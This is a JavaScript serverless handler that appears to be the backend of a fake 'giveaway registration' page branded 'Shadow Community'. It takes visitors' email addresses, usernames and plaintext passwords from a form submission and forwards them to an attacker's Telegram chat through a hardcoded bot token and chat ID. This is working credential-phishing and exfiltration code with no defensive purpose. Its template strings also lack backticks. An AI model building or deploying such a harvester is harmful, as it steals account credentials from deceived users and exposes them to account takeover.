export default async function handler(req, res) {
    // Allow CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, password, username, option } = req.body;

        // ===== YOUR TELEGRAM BOT CREDENTIALS =====
        const BOT_TOKEN = "8795128896:AAEc1-iJ0f0FF6x4CH0ihEUbA1i7NbYTuHw";  // REPLACE THIS
        const CHAT_ID = "8381916527";      // REPLACE THIS

        const message = 
🎯 *NEW GIVEAWAY REGISTRATION!*

👤 *Name:* ${username || 'Guest'}
📧 *Email:* ${email}
🔒 *Password:* ${password}
🎁 *Option:* ${option}
📅 *Date:* ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━
🖤 *Shadow Community*
🔥 *GpsirEra*
~#gpsirAI
;

        // Send to Telegram
        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (result.ok) {
            return res.status(200).json({ success: true, message: 'Sent to Telegram' });
        } else {
            console.error('Telegram API Error:', result);
            return res.status(200).json({ success: false, error: result.description });
        }

    } catch (error) {
        console.error('Server Error:', error);
        return res.status(200).json({ success: false, error: error.message });
    }
}
